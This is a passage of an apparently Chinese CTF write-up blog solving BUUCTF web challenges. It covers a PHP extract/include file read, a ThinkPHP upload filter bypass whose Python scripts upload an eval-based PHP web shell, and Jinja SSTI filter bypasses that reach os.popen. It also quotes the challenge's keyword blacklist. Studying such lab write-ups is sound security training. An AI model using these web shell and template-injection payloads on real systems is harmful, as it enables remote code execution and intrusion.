class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span> <br><br><span class="hljs-comment">/**</span><br><span class="hljs-comment">* 所有控制器的父类</span><br><span class="hljs-comment">*/</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">BaseController</span></span><br><span class="hljs-class"></span>&#123;<br><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * 加载视图文件</span><br><span class="hljs-comment"> * viewName 视图名称</span><br><span class="hljs-comment"> * viewData 视图分配数据</span><br><span class="hljs-comment">*/</span><br><span class="hljs-keyword">private</span> <span class="hljs-variable">$viewPath</span>;<br><span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">loadView</span>(<span class="hljs-params"><span class="hljs-variable">$viewName</span> =<span class="hljs-string">&#x27;&#x27;</span>, <span class="hljs-variable">$viewData</span> = []</span>)</span><br><span class="hljs-function"></span>&#123;<br><span class="hljs-variable language_">$this</span>-&gt;viewPath = BASE_PATH . <span class="hljs-string">&quot;/View/<span class="hljs-subst">&#123;$viewName&#125;</span>.php&quot;</span>;<br><span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">file_exists</span>(<span class="hljs-variable">$this</span>-&gt;viewPath))<br>&#123;<br><span class="hljs-title function_ invoke__">extract</span>(<span class="hljs-variable">$viewData</span>);<br><span class="hljs-keyword">include</span> <span class="hljs-variable language_">$this</span>-&gt;viewPath;<br>&#125;<br>&#125;<br><br>&#125;<br><br></code></pre></td></tr></table></figure><p>发现了个<code>loadView</code>方法，存在<code>extract</code>和<code>include</code>。现在估计这两个方法都能读<code>flag</code>？继续找在哪里被调用：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span> <br><br><span class="hljs-comment">/**</span><br><span class="hljs-comment">* 用户控制器</span><br><span class="hljs-comment">*/</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">UserController</span> <span class="hljs-keyword">extends</span> <span class="hljs-title">BaseController</span></span><br><span class="hljs-class"></span>&#123;<br><span class="hljs-comment">// 访问列表</span><br><span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">actionList</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function"></span>&#123;<br><span class="hljs-variable">$params</span> = <span class="hljs-variable">$_REQUEST</span>;<br><span class="hljs-variable">$userModel</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">UserModel</span>();<br><span class="hljs-variable">$listData</span> = <span class="hljs-variable">$userModel</span>-&gt;<span class="hljs-title function_ invoke__">getPageList</span>(<span class="hljs-variable">$params</span>);<br><span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">loadView</span>(<span class="hljs-string">&#x27;userList&#x27;</span>, <span class="hljs-variable">$listData</span> );<br>&#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">actionIndex</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-variable">$listData</span> = <span class="hljs-variable">$_REQUEST</span>;<br>        <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">loadView</span>(<span class="hljs-string">&#x27;userIndex&#x27;</span>,<span class="hljs-variable">$listData</span>);<br>    &#125;<br><br>&#125;<br></code></pre></td></tr></table></figure><p><code>actionIndex</code>方法中的<code>$listData</code>完全可控，去<code>userIndex.php</code>看看：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>                <span class="hljs-keyword">if</span>(!<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$img_file</span>)) &#123;<br>                    <span class="hljs-variable">$img_file</span> = <span class="hljs-string">&#x27;/../favicon.ico&#x27;</span>;<br>                &#125;<br>                <span class="hljs-variable">$img_dir</span> = <span class="hljs-title function_ invoke__">dirname</span>(<span class="hljs-keyword">__FILE__</span>) . <span class="hljs-variable">$img_file</span>;<br>                <span class="hljs-variable">$img_base64</span> = <span class="hljs-title function_ invoke__">imgToBase64</span>(<span class="hljs-variable">$img_dir</span>);<br>                <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;&lt;img src=&quot;&#x27;</span> . <span class="hljs-variable">$img_base64</span> . <span class="hljs-string">&#x27;&quot;&gt;&#x27;</span>;       <span class="hljs-comment">//图片形式展示</span><br>                <span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>考虑到<code>loadview</code>方法中存在<code>extract</code>，直接<code>GET</code>或<code>POST</code>传<code>img_file=/../flag</code>就行。</p><p>注意<code>fun.php</code>下这个路由控制跳转：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">if</span>(!<span class="hljs-keyword">empty</span>(<span class="hljs-variable">$_REQUEST</span>[<span class="hljs-string">&#x27;r&#x27;</span>]))<br>&#123;<br><span class="hljs-variable">$r</span> = <span class="hljs-title function_ invoke__">explode</span>(<span class="hljs-string">&#x27;/&#x27;</span>, <span class="hljs-variable">$_REQUEST</span>[<span class="hljs-string">&#x27;r&#x27;</span>]);<br><span class="hljs-keyword">list</span>(<span class="hljs-variable">$controller</span>,<span class="hljs-variable">$action</span>) = <span class="hljs-variable">$r</span>;<br><span class="hljs-variable">$controller</span> = <span class="hljs-string">&quot;<span class="hljs-subst">&#123;$controller&#125;</span>Controller&quot;</span>;<br><span class="hljs-variable">$action</span> = <span class="hljs-string">&quot;action<span class="hljs-subst">&#123;$action&#125;</span>&quot;</span>;<br><br><br><span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">class_exists</span>(<span class="hljs-variable">$controller</span>))<br>&#123;<br><span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">method_exists</span>(<span class="hljs-variable">$controller</span>,<span class="hljs-variable">$action</span>))<br>&#123;<br><span class="hljs-comment">//</span><br>&#125;<br><span class="hljs-keyword">else</span><br>&#123;<br><span class="hljs-variable">$action</span> = <span class="hljs-string">&quot;actionIndex&quot;</span>;<br>&#125;<br>&#125;<br><span class="hljs-keyword">else</span><br>&#123;<br><span class="hljs-variable">$controller</span> = <span class="hljs-string">&quot;LoginController&quot;</span>;<br>        <span class="hljs-variable">$action</span> = <span class="hljs-string">&quot;actionIndex&quot;</span>;<br>&#125;<br>    <span class="hljs-variable">$data</span> = <span class="hljs-title function_ invoke__">call_user_func</span>(<span class="hljs-keyword">array</span>( (<span class="hljs-keyword">new</span> <span class="hljs-variable">$controller</span>), <span class="hljs-variable">$action</span>));<br>&#125; <span class="hljs-keyword">else</span> &#123;<br>    <span class="hljs-title function_ invoke__">header</span>(<span class="hljs-string">&quot;Location:index.php?r=Login/Index&quot;</span>);<br>&#125;<br><br></code></pre></td></tr></table></figure><p><code>payload</code>:<code>index.php?r=User/Index&amp;img_file=/../flag.php</code></p><h4 id="思路总结-3"><a href="#思路总结-3" class="headerlink" title="思路总结:"></a>思路总结:</h4><p><code>index.php</code>会包含<code>fun.php</code>，<code>fun.php</code>下会对<code>$_REQUEST[&#39;r&#39;]</code>得到的参数以<code>/</code>分割：<code>$controller,$action</code>来调用指定<code>controller</code>下的指定方法。然后通过<code>extract</code>去覆盖<code>$img_file</code>的值，把结果以<code>base64</code>形式输出。</p><p>对于<code>REQUEST</code>这种超全局变量，GETPOST传都行。</p><h2 id="RoarCTF-2019-Simple-Upload"><a href="#RoarCTF-2019-Simple-Upload" class="headerlink" title="[RoarCTF 2019]Simple Upload"></a>[RoarCTF 2019]Simple Upload</h2><p>调用Thinkphp框架上传</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><code class="hljs php"> <span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">namespace</span> <span class="hljs-title class_">Home</span>\<span class="hljs-title class_">Controller</span>;<br><br><span class="hljs-keyword">use</span> <span class="hljs-title">Think</span>\<span class="hljs-title">Controller</span>;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">IndexController</span> <span class="hljs-keyword">extends</span> <span class="hljs-title">Controller</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">index</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-title function_ invoke__">show_source</span>(<span class="hljs-keyword">__FILE__</span>);<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">upload</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-variable">$uploadFile</span> = <span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;file&#x27;</span>] ;<br>        <br>        <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">strstr</span>(<span class="hljs-title function_ invoke__">strtolower</span>(<span class="hljs-variable">$uploadFile</span>[<span class="hljs-string">&#x27;name&#x27;</span>]), <span class="hljs-string">&quot;.php&quot;</span>) ) &#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>        &#125;<br>        <br>        <span class="hljs-variable">$upload</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">\Think\Upload</span>();<span class="hljs-comment">// 实例化上传类</span><br>        <span class="hljs-variable">$upload</span>-&gt;maxSize  = <span class="hljs-number">4096</span> ;<span class="hljs-comment">// 设置附件上传大小</span><br>        <span class="hljs-variable">$upload</span>-&gt;allowExts  = <span class="hljs-keyword">array</span>(<span class="hljs-string">&#x27;jpg&#x27;</span>, <span class="hljs-string">&#x27;gif&#x27;</span>, <span class="hljs-string">&#x27;png&#x27;</span>, <span class="hljs-string">&#x27;jpeg&#x27;</span>);<span class="hljs-comment">// 设置附件上传类型</span><br>        <span class="hljs-variable">$upload</span>-&gt;rootPath = <span class="hljs-string">&#x27;./Public/Uploads/&#x27;</span>;<span class="hljs-comment">// 设置附件上传目录</span><br>        <span class="hljs-variable">$upload</span>-&gt;savePath = <span class="hljs-string">&#x27;&#x27;</span>;<span class="hljs-comment">// 设置附件上传子目录</span><br>        <span class="hljs-variable">$info</span> = <span class="hljs-variable">$upload</span>-&gt;<span class="hljs-title function_ invoke__">upload</span>() ;<br>        <span class="hljs-keyword">if</span>(!<span class="hljs-variable">$info</span>) &#123;<span class="hljs-comment">// 上传错误提示错误信息</span><br>          <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">error</span>(<span class="hljs-variable">$upload</span>-&gt;<span class="hljs-title function_ invoke__">getError</span>());<br>          <span class="hljs-keyword">return</span>;<br>        &#125;<span class="hljs-keyword">else</span>&#123;<span class="hljs-comment">// 上传成功 获取上传文件信息</span><br>          <span class="hljs-variable">$url</span> = __ROOT__.<span class="hljs-title function_ invoke__">substr</span>(<span class="hljs-variable">$upload</span>-&gt;rootPath,<span class="hljs-number">1</span>).<span class="hljs-variable">$info</span>[<span class="hljs-string">&#x27;file&#x27;</span>][<span class="hljs-string">&#x27;savepath&#x27;</span>].<span class="hljs-variable">$info</span>[<span class="hljs-string">&#x27;file&#x27;</span>][<span class="hljs-string">&#x27;savename&#x27;</span>] ;<br>          <span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">json_encode</span>(<span class="hljs-keyword">array</span>(<span class="hljs-string">&quot;url&quot;</span>=&gt;<span class="hljs-variable">$url</span>,<span class="hljs-string">&quot;success&quot;</span>=&gt;<span class="hljs-number">1</span>));<br>        &#125;<br>    &#125;<br>&#125; <br></code></pre></td></tr></table></figure><p>这题完全不会做。。。<a href="https://mayi077.gitee.io/2020/04/23/RoarCTF-2019-Simple-Upload/">参考资料1</a></p><p><a href="https://inanb.github.io/2021/09/15/RoarCTF-2019-Simple-Upload/">参考资料2</a></p><p>thinkphp中upload类的upload方法：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs php"> <span class="hljs-comment">/**</span><br><span class="hljs-comment">   * 上传单个文件</span><br><span class="hljs-comment">   * <span class="hljs-doctag">@param</span>  array  $file 文件数组</span><br><span class="hljs-comment">   * <span class="hljs-doctag">@return</span> array        上传成功后的文件信息</span><br><span class="hljs-comment">   */</span><br>  <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">uploadOne</span>(<span class="hljs-params"><span class="hljs-variable">$file</span></span>)</span><br><span class="hljs-function">  </span>&#123;<br>      <span class="hljs-variable">$info</span> = <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">upload</span>(<span class="hljs-keyword">array</span>(<span class="hljs-variable">$file</span>));<br>      <span class="hljs-keyword">return</span> <span class="hljs-variable">$info</span> ? <span class="hljs-variable">$info</span>[<span class="hljs-number">0</span>] : <span class="hljs-variable">$info</span>;<br>  &#125;<br><br>  <span class="hljs-comment">/**</span><br><span class="hljs-comment">   * 上传文件</span><br><span class="hljs-comment">   * <span class="hljs-doctag">@param</span> 文件信息数组 $files ，通常是 $_FILES数组</span><br><span class="hljs-comment">   */</span><br>  <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">upload</span>(<span class="hljs-params"><span class="hljs-variable">$files</span> = <span class="hljs-string">&#x27;&#x27;</span></span>)</span><br><span class="hljs-function">  </span>&#123;<br>      <span class="hljs-keyword">if</span> (<span class="hljs-string">&#x27;&#x27;</span> === <span class="hljs-variable">$files</span>) &#123;<br>          <span class="hljs-variable">$files</span> = <span class="hljs-variable">$_FILES</span>;<br>      &#125;<br>      <span class="hljs-keyword">if</span> (<span class="hljs-keyword">empty</span>(<span class="hljs-variable">$files</span>)) &#123;<br>          <span class="hljs-variable language_">$this</span>-&gt;error = <span class="hljs-string">&#x27;没有上传的文件！&#x27;</span>;<br>          <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>      &#125;<br>........<br>      ........<br>  &#125;<br><br></code></pre></td></tr></table></figure><p>无参调用时，$files将为空串，且传入<code>$_FILES</code>数组，即多文件上传。而且注意</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$uploadFile</span> = <span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;file&#x27;</span>] ;<br>       <br>       <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">strstr</span>(<span class="hljs-title function_ invoke__">strtolower</span>(<span class="hljs-variable">$uploadFile</span>[<span class="hljs-string">&#x27;name&#x27;</span>]), <span class="hljs-string">&quot;.php&quot;</span>) ) &#123;<br></code></pre></td></tr></table></figure><p>这东西只检测<code>file</code>参数的值，如果上传<code>file1</code>之类的参数他并不会检测后缀。</p><p>但直接上传非<code>file</code>参数肯定不行，因为上传后返回的文件信息：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$url</span> = __ROOT__.<span class="hljs-title function_ invoke__">substr</span>(<span class="hljs-variable">$upload</span>-&gt;rootPath,<span class="hljs-number">1</span>).<span class="hljs-variable">$info</span>[<span class="hljs-string">&#x27;file&#x27;</span>][<span class="hljs-string">&#x27;savepath&#x27;</span>].<span class="hljs-variable">$info</span>[<span class="hljs-string">&#x27;file&#x27;</span>][<span class="hljs-string">&#x27;savename&#x27;</span>] ;<br>          <span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">json_encode</span>(<span class="hljs-keyword">array</span>(<span class="hljs-string">&quot;url&quot;</span>=&gt;<span class="hljs-variable">$url</span>,<span class="hljs-string">&quot;success&quot;</span>=&gt;<span class="hljs-number">1</span>));<br></code></pre></td></tr></table></figure><p>还是<code>file</code>参数的信息，而且上传后的文件名是根据<code>uniqid</code>生成的。</p><p>所以解题思路就是上传多个文件，顺序：<code>file</code>,<code>非file</code>.<code>file</code>。通过爆破前后两个<code>file</code>之间的<code>uniqid</code>来确定上传的<code>非file</code>文件名是多少：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br>url = <span class="hljs-string">&#x27;http://24777c04-c0bf-474f-9ab7-ff68a98e3172.node5.buuoj.cn:81//index.php/home/index/upload&#x27;</span><br>files = &#123;<span class="hljs-string">&#x27;file&#x27;</span>:(<span class="hljs-string">&quot;1.txt&quot;</span>,<span class="hljs-string">&quot;&quot;</span>)&#125;<br>files2=&#123;<span class="hljs-string">&#x27;file[]&#x27;</span>:(<span class="hljs-string">&#x27;1.php&#x27;</span>,<span class="hljs-string">&quot;&lt;?php eval($_GET[&#x27;cmd&#x27;])?&gt;&quot;</span>)&#125;<br>r = requests.post(url,files = files)<br><span class="hljs-built_in">print</span> (r.text)<br>r = requests.post(url,files = files2)<br><span class="hljs-built_in">print</span> (r.text)<br>r = requests.post(url,files = files)<br><span class="hljs-built_in">print</span> (r.text)<br></code></pre></td></tr></table></figure><p><img src="/img/ximpleuploadd1.png" alt="ximpleuploadd1"></p><p>注意这里<code>files = files</code>，<code>files</code>是<code>post</code>中专门用于上传文件的参数。</p><p>如果不用<code>file[]</code>这种参数，直接上传<code>php</code>文件：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br>url = <span class="hljs-string">&#x27;http://24777c04-c0bf-474f-9ab7-ff68a98e3172.node5.buuoj.cn:81//index.php/home/index/upload&#x27;</span><br>files = &#123;<span class="hljs-string">&#x27;file&#x27;</span>:(<span class="hljs-string">&quot;1.txt&quot;</span>,<span class="hljs-string">&quot;&quot;</span>)&#125;<br>files2=&#123;<span class="hljs-string">&#x27;file&#x27;</span>:(<span class="hljs-string">&#x27;1.php&#x27;</span>,<span class="hljs-string">&quot;&lt;?php eval($_GET[&#x27;cmd&#x27;])?&gt;&quot;</span>)&#125;<br>r = requests.post(url,files = files)<br><span class="hljs-built_in">print</span> (r.text)<br>r = requests.post(url,files = files2)<br><span class="hljs-built_in">print</span> (r.text)<br>r = requests.post(url,files = files)<br><span class="hljs-built_in">print</span> (r.text)<br></code></pre></td></tr></table></figure><p><img src="/img/ximpleuploadd2.png" alt="ximpleuploadd2"></p><p>其实做这题做的不是很明白。。我看有些师傅说同时上传多个文件就能绕过对<code>php</code>后缀的检测。。但这里是和参数名是否是<code>file</code>有关？</p><p>第二种解法就是利用<code>strip_tags</code>函数：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">foreach</span> (<span class="hljs-variable">$files</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$key</span> =&gt; <span class="hljs-variable">$file</span>) &#123;<br>      <span class="hljs-variable">$file</span>[<span class="hljs-string">&#x27;name&#x27;</span>]  = <span class="hljs-title function_ invoke__">strip_tags</span>(<span class="hljs-variable">$file</span>[<span class="hljs-string">&#x27;name&#x27;</span>]);<br>      <span class="hljs-keyword">if</span>(!<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$file</span>[<span class="hljs-string">&#x27;key&#x27;</span>])) <span class="hljs-variable">$file</span>[<span class="hljs-string">&#x27;key&#x27;</span>] = <span class="hljs-variable">$key</span>;<br>       <span class="hljs-comment">/* 通过扩展获取文件类型，可解决FLASH上传$FILES数组返回文件类型错误的问题 */</span><br>            <span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$finfo</span>))&#123;<br>                <span class="hljs-variable">$file</span>[<span class="hljs-string">&#x27;type&#x27;</span>]   =   <span class="hljs-title function_ invoke__">finfo_file</span> ( <span class="hljs-variable">$finfo</span> ,  <span class="hljs-variable">$file</span>[<span class="hljs-string">&#x27;tmp_name&#x27;</span>] );<br>&#125;<br></code></pre></td></tr></table></figure><p>这里用<code>strip_tags</code>对文件名进行了处理，所以直接上传<code>任意.&lt;&gt;php</code>经处理后变成<code>任意.php</code>即可。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span>  requests<br><br>url = <span class="hljs-string">&quot;http://24777c04-c0bf-474f-9ab7-ff68a98e3172.node5.buuoj.cn:81//index.php/home/index/upload&quot;</span><br><br>files=&#123;<span class="hljs-string">&#x27;file&#x27;</span>:(<span class="hljs-string">&#x27;1.&lt;&gt;php&#x27;</span>,<span class="hljs-string">&quot;&lt;?php eval($_GET[&#x27;cmd&#x27;])?&gt;&quot;</span>)&#125;<br>r=requests.post(url=url,files=files)<br><span class="hljs-built_in">print</span>(r.text)<br></code></pre></td></tr></table></figure><h4 id="思路总结-4"><a href="#思路总结-4" class="headerlink" title="思路总结"></a>思路总结</h4><p><code>thinkphp</code>文件上传？</p><h2 id="NPUCTF2020-ezlogin"><a href="#NPUCTF2020-ezlogin" class="headerlink" title="[NPUCTF2020]ezlogin"></a>[NPUCTF2020]ezlogin</h2><h2 id="GWCTF-2019-你的名字"><a href="#GWCTF-2019-你的名字" class="headerlink" title="[GWCTF 2019]你的名字"></a>[GWCTF 2019]你的名字</h2><p><code>SSTI</code>，输入<code>&#123;&#123;7*7&#125;&#125;</code>会报错：</p><p>![GWCTF 2019yourname1](img&#x2F;GWCTF 2019yourname1.png)</p><p>看了这个报错我还以为不是<code>SSTI</code>。。</p><p>过滤了双括号，<code>&#123;%print (7*7)%&#125;</code>发现能执行。</p><p>网上比较常见的wp这么写的：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">&#123;%<span class="hljs-built_in">print</span> lipsum.__globals__[<span class="hljs-string">&#x27;__bui&#x27;</span>+<span class="hljs-string">&#x27;ltins__&#x27;</span>][<span class="hljs-string">&#x27;__im&#x27;</span>+<span class="hljs-string">&#x27;port__&#x27;</span>](<span class="hljs-string">&#x27;o&#x27;</span>+<span class="hljs-string">&#x27;s&#x27;</span>)[<span class="hljs-string">&#x27;po&#x27;</span>+<span class="hljs-string">&#x27;pen&#x27;</span>](<span class="hljs-string">&#x27;命令&#x27;</span>).read()%&#125;<br></code></pre></td></tr></table></figure><p><code>&#123;%%&#125;</code>这东西很好理解，过滤双括号后比较常见的绕过方法。不过一开始不知道<code>lipsum</code>这东西是个啥。查了一下<code>lipsum</code>这东西是flask的一个方法，可以直接和<code>__globals__</code>配合：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">lipsum.__globals__[<span class="hljs-string">&#x27;__builtins__&#x27;</span>]<br></code></pre></td></tr></table></figure><p>既然有现成的方法就不需要：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-string">&#x27;&#x27;</span>.__class__.__base__.__subclasses__()[<span class="hljs-number">1</span>].__init__.<br></code></pre></td></tr></table></figure><p>也可以这么写：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">&#123;%<span class="hljs-built_in">print</span> lipsum.__globals__.__builconfigtins__.__impoconfigrt__(<span class="hljs-string">&#x27;oconfigs&#x27;</span>).poconfigpen(<span class="hljs-string">&#x27;命令&#x27;</span>).read()%&#125;<br></code></pre></td></tr></table></figure><p>这方法发涉及到源码中的过滤方法：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs python">blacklist = [<span class="hljs-string">&#x27;import&#x27;</span>, <span class="hljs-string">&#x27;getattr&#x27;</span>, <span class="hljs-string">&#x27;os&#x27;</span>, <span class="hljs-string">&#x27;class&#x27;</span>, <span class="hljs-string">&#x27;subclasses&#x27;</span>, <span class="hljs-string">&#x27;mro&#x27;</span>, <span class="hljs-string">&#x27;request&#x27;</span>, <span class="hljs-string">&#x27;args&#x27;</span>, <span class="hljs-string">&#x27;eval&#x27;</span>, <span class="hljs-string">&#x27;if&#x27;</span>, <span class="hljs-string">&#x27;for&#x27;</span>,<br>                 <span class="hljs-string">&#x27; subprocess&#x27;</span>, <span class="hljs-string">&#x27;file&#x27;</span>, <span class="hljs-string">&#x27;open&#x27;</span>, <span class="hljs-string">&#x27;popen&#x27;</span>, <span class="hljs-string">&#x27;builtins&#x27;</span>, <span class="hljs-string">&#x27;compile&#x27;</span>, <span class="hljs-string">&#x27;execfile&#x27;</span>, <span class="hljs-string">&#x27;from_pyfile&#x27;</span>, <span class="hljs-string">&#x27;local&#x27;</span>,<br>                 <span class="hljs-string">&#x27;self&#x27;</span>, <span class="hljs-string">&#x27;item&#x27;</span>, <span class="hljs-string">&#x27;getitem&#x27;</span>, <span class="hljs-string">&#x27;getattribute&#x27;</span>, <span class="hljs-string">&#x27;func_globals&#x27;</span>, <span class="hljs-string">&#x27;config&#x27;</span>];<br><span class="hljs-keyword">for</span> no <span class="hljs-keyword">in</span> blacklist:<br>    <span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>        <span class="hljs-keyword">if</span> no <span class="hljs-keyword">in</span> s:<br>            s = s.replace(no, <span class="hljs-string">&#x27;&#x27;</span>)<br>        <span class="hljs-keyword">else</span>:<br>            <span class="hljs-keyword">break</span><br><span class="hljs-keyword">return</span> s<br></code></pre></td></tr></table></figure><p>这东西会在<code>blacklist</code>中按顺序取字符串然后检查用户输入中有没有，有的话替换成空继续检测直到不存在目标字符串，然后跳到下一个关键字的检测</p><p><code>config</code>这东西被他放到最后了，所以可以在关键字中间插入<code>config</code>实现绕过。</p><p>当然也可以分别定义：</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span 